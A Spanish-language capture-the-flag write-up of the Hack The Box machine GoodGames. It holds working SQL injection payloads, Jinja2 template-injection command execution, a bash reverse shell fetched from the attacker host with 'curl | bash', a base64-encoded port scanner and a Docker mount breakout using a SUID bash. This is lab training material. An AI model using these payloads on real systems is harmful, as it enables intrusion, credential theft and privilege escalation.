---
Certs: eJPT eWPT eCPPTv2 OSCP (Escalada)
---
Skills:

- #SQLI (Error Based)
- Hash Cracking Weak Algorithms
- Password Reuse
- Server Side Template Injection #SSTI
- #Docker_Breakout (Privilege Escalation) [PIVOTING]

----

Iniciamos realizando un scaneo de puertos
![[Pasted image 20240507160413.png]]
si nos metemos en la web vemos que hay varios formularios, vamos a intentar hacer un SQLi a ver si reacciona.
![[Pasted image 20240508105802.png]]
vamos a capturar la peticion con [[burpsuite]] y vamos a saltarnos la verificacion de correo valido.
![[Pasted image 20240508110225.png]]
es vulnerable, asique vamos a poner esto en la peticion y haremos un forward para se admin
![[Pasted image 20240508114721.png]]
![[Pasted image 20240508114744.png]]
![[Pasted image 20240508114818.png]]
tenemos este correo `admin@goodgames.htb` y hay tambien un panel de ajustes al que parece ser que no tenemos acceso `https://internal-administration.goodgames.htb/` 
![[Pasted image 20240508114921.png]]
agregamos el host al archivo host y buscamos sin https es decir:
![[Pasted image 20240508115145.png]]
y ahora lo buscamos
![[Pasted image 20240508115203.png]]
vamos a intentar, aprovechando la SQLi de antes, encontrata credenciales validos, primero vamos a ver si encontramos el numero de columnas, en este caso 4, ya que si ponemos mas el content length cambia para mal (ya que si ponemos 1323423 tambien nos lo pondria)
![[Pasted image 20240508120714.png]]
ya que sabemos que estamos usando `Flask Volt` vamos a ver si el servidor hacer `server side template injection` [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-ssti-server-side-template-injection) viendo si hace esta cuenta 
```sql
email=234234234' union select 1,2,3,"{{7*7}}"-- -&password=marce
```
vemos que almenos esta parte no es vulnerable ya que no hace el calculo
![[Pasted image 20240508124711.png]]

Si hacemos un `union select` vemos esto:
![[Pasted image 20240508121240.png]]
nos muestra el ultimo valor asique vamos a jugar con eso para encontrar datos, vamos a ver el nombre de la base de datos
![[Pasted image 20240508121527.png]]
estamos en la main, ahora vamos todas las bases de datos que podemos ver
```sql
email=234234234' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- -&password=marce
```
![[Pasted image 20240508122216.png]]
solo hay 1 realmente asique vamos a ver las tablas de esta base de datos
![[Pasted image 20240508122508.png]]
otra forma de hacerlo desde consola seria asi:
```bash
for i in $(seq 0 100); do echo "[+] Para el número $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\" limit $i,1-- -&password=asdf" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
```
![[Pasted image 20240508125613.png]]

ahora vamos a ver las columnas
```sql
email=234234234' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema = "main" and table_name = "user"-- -&password=marce
```
![[Pasted image 20240508123043.png]]
ahora vamos a lista los usuarios y password
`admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec`
![[Pasted image 20240508123601.png]]
![[Pasted image 20240508123830.png]]
`admin@goodgames.htb:superadministrator`
ahora ponemos `admin:superadministrator` y tenemos acceso al panel de admin
![[Pasted image 20240508161316.png]]
tenemos una forma de representar nuestro input
![[Pasted image 20240508162637.png]]
vamos a ver si hace calculos
![[Pasted image 20240508162726.png]]
esto puede hacer referencia a un SSIT https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
vamos a intentar explotarlo, nos vamos a este recurso. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection, concretamete a python-jinja2
![[Pasted image 20240508165956.png]]
y seguimos las intrucciones,despues de ponernos en escucha use esta opcion
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
![[Pasted image 20240508171336.png]]
lo tenemos!!, ahora vamos a intentar una revershell, pero no podemos al parcer estamos en un contenedor!!
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('hostname -i').read() }}
```
![[Pasted image 20240508172305.png]]
vamos a ver si podemos hacer es validad si tenemos conexion por traza ICMP, para ello nos ponemos en escucha por icmp usando [[tcpdump]]
```bash
tcpdump -i tun0 icmp -n
```
y mandamos un ping 
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ping -c 1 10.10.14.39').read() }}
```
![[Pasted image 20240508173555.png]]
y si tienemos conexion por ICMP
![[Pasted image 20240508173604.png]]
ahora viene el punto de hacer un revershell, para ello vamos a crear un archivo html con este valor:
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.39/443 0>&1
```
ahora vamos a compartir el recurso con python ya que asi si mostramos el texto de esta forma
![[Pasted image 20240508174749.png]]
ahora si hacemos un curl en la victima, vera esto:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.39').read() }}
```
![[Pasted image 20240508175049.png]]
ahora si nos ponemos en escucha y hacemos que se interprete con bash tenemos una revershell.
```bash
nc -lnvp 443
```
en la victima:
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.39 | bash').read() }}
```

![[Pasted image 20240508180211.png]]
y ya tenemos la revershell
![[Pasted image 20240508180306.png]]
vamos a hacer un [[Tratamiento de la tty]]
![[Pasted image 20240508182211.png]]
ahora vamos a intentar salir del docker, vemos que tenemos la ip: `172.19.0.2` por lo que podemos deducir que hay una ip `172.19.0.1` la cual es la interface que conecta la maquina real conn el docker, vamos a comprobarlo
```bash
route -n
```
![[Pasted image 20240508190756.png]]
ahora investigando nos damos cuenta de que hay un directorio en `home` llamado `augustus` pero si nos vamos al `/etc/passwd` no esta este usuario "1000"
![[Pasted image 20240508191212.png]]
 esto significa que lo mas problable es que estemos jugando con monturas, es decir es posible que el directorio de la maquina real, este montado en el docker, para poder verlo podemos usar este comando:
```bash
mount 
```
pero para poder filtrar un poco vamos a poner el directorio donde queremos saber si hay algo montado que en este caso es `home`
```bash
mount | grep home
```
![[Pasted image 20240508191534.png]]vemos que el directorio `dev/sda1` esta montado en `/home/augustus`, vamos a listar todos los discos en el equipo, con cualquiera de estos dos comandos
```bash
fdisk -l
o
df -h
```
![[Pasted image 20240508191825.png]]
vamos a ver que puertos tiene abiertos la ip del docker `172.19.0.1`, para ello vamos a hacer uso de este comando comprobando el codigo de estado
![[Pasted image 20240508192913.png]]si es 0 significa que el puerto esta abierto pero si es 1 es que esta cerrado
![[Pasted image 20240508193038.png]]
vamos a hacer un script
```
(echo '' > /dev/tcp/172.19.0.1/81) 2>/dev/null && echo "[+] Puerto abierto" || echo "[-] Puerto Cerrado"
```
esto nos dice si el pierto esta abierto o cerrado, asique vamos a automatizarlo, (creamos el script en nuestra maquina para porder ahcer mas comodos)
```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  tput cnorm; exit 1
}

#ctrl+c

trap ctrl_c INT

tput civis

for port in $(seq 1 65535); do
  (timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null) && echo "[+] Puerto abierto: $port" || echo "[-] Puerto Cerrado: $echo"&
done; wait
tput cnorm
```

ahora vamos ha pasarla base64 para poder usarlo en la maquina victima ya que la maquina victima no tiene ningun editor de codigo
```base64
IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogIGVjaG8gLWUgIlxuXG5bIV0gU2FsaWVuZG8uLi5cbiIKICB0cHV0IGNub3JtOyBleGl0IDEKfQoKI2N0cmwrYwoKdHJhcCBjdHJsX2MgSU5UCgp0cHV0IGNpdmlzCgpmb3IgcG9ydCBpbiAkKHNlcSAxIDY1NTM1KTsgZG8KICAodGltZW91dCAxIGJhc2ggLWMgImVjaG8gJycgPiAvZGV2L3RjcC8xNzIuMTkuMC4xLyRwb3J0IiAyPi9kZXYvbnVsbCkgJiYgZWNobyAiWytdIFB1ZXJ0byBhYmllcnRvOiAkcG9ydCIgfHwgZWNobyAiWy1dIFB1ZXJ0byBDZXJyYWRvOiAkZWNobyImCmRvbmU7IHdhaXQKdHB1dCBjbm9ybQo=
```
![[Pasted image 20240508204240.png]]
ahora en la victima lo decodeamos y pasamos a un archivo y le damos permisos de ejecucion
![[Pasted image 20240508204316.png]]
y lo ejecutamos grepeando por el puerto que esta abierto
![[Pasted image 20240508205131.png]]
vamos a ver si podemos hacer algo con ese puerto 22, vamos a intentar reutilizar credenciales `admin:superadministrator` o tambien `augustus:superadministrator` ya que es un usuario que sabesmos que existe
![[Pasted image 20240508205850.png]]

ahora vamos a intentar escalar privilegios, podemos intentarlo atraves de docker mirando si estamos en el grupo de docker
![[Pasted image 20240508210242.png]]
en este caso no, asique vamos a buscar otras formas, si nos fijamos el path es muy pequeño
![[Pasted image 20240508210557.png]]
vamos a poner el path de nustro equipo para extender las localizaciones de binario
```bash
export PATH=/opt/kitty/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/opt/nvim/nvim-linux64/bin:/usr/sbin:/root/.fzf/bin
```
ahora vamos a analizar por archivos con permisos SUID pero no hay asique vamos a ver si tenemos `capabilities` con `getcap`
![[Pasted image 20240508210823.png]]
buscamos capabilities en todo el equipo
![[Pasted image 20240508210906.png]]
pero solo lo tenemos en ping asi que no podemos hacer nada, vamos a hacer una cosa ya que somos root en el docker, vamos a copiar la bash a la montura y luego le vamos a dar permisos SUID asi como hacer root al propitario y luego desde fuera del docker vamos a ejecutarla
![[Pasted image 20240508211605.png]]
ahora nos vamos al docker (`exit`) y cambiamos los permisos y el propietario
![[Pasted image 20240508211812.png]]
ahora nos vamos a la maquina real
![[Pasted image 20240508211905.png]]
y ya la tenemos
![[Pasted image 20240508211951.png]]





